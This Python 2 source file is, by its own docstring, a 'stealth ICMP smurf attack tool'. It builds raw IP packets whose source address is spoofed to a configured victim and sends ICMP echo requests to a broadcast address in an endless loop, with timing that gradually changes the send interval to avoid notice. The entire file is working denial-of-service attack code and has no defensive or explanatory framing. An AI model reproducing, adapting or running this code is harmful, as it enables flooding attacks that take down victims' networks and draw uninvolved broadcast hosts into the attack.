"""
Stealth ICMP smurf attack tool
"""

import random
import socket
import sys
import time

from .. import configs

# GLOBALS
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)  # 1024 represents one byte to the server

sent = 0


def IPHeader(source, destination, proto):
    packet = b''
    packet += b'\x45'  # Version (IPv4) + Internet Protocol header length
    packet += b'\x00'  # no quality of service
    packet += b'\x00\x54'  # Total frame length
    packet += b'\x23\x2c'  # Id of this packet
    packet += b'\x40'  # Flags (Don't Fragment)
    packet += b'\x00'  # Fragment offset: 0
    packet += b'\x40'  # Time to live: 64
    packet += proto  # Protocol: ICMP (1)
    packet += b'\x0a\x0a'  # Checksum (python does the work for us)
    packet += socket.inet_aton(source)  # Set source IP to the supplied one
    packet += socket.inet_aton(destination)  # Set destination IP to the supplied one
    return packet


def CreateICMPRequest():
    packet = b''
    packet += b'\x08'  # ICMP Type:8 (icmp echo request)
    packet += b'\x00'  # Code 0 (no code)
    packet += b'\xbd\xcb'  # Checksum
    packet += b'\x16\x4f'  # Identifier (big endian representation)
    packet += b'\x00\x01'  # Sequence number (big endian representation)
    packet += b'\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'  # Data (56 bytes)
    return packet


def stealth_smurf():
    global sent
    duration = 0
    try:
        icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmpsocket.bind(('', 1))
        icmpsocket.setblocking(0)
        icmpsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except socket.error:
        print "You need to be root!"
        sys.exit(1)

    icmpsocket.connect((configs.broadcast_address, 1))

    while True:
        # send packet
        icmpsocket.send(str(IPHeader(configs.victim, configs.broadcast_address, proto=b'\x01')) + str(CreateICMPRequest()))

        # increment counter
        sent += 1

        # print log
        print "%s packets were sent to %s. interval time: %s, send interval: %s" % (sent, configs.victim, duration, configs.send_interval)

        # sleep for send_interval secs
        time.sleep(configs.send_interval)

        # increment duration
        duration += configs.send_interval

        # if window len wasn't over continue
        if duration < configs.window_length:
            continue

        # start new window and initial duration and send interval
        duration = 0

        configs.send_interval *= configs.interval_factor

    icmpsocket.close
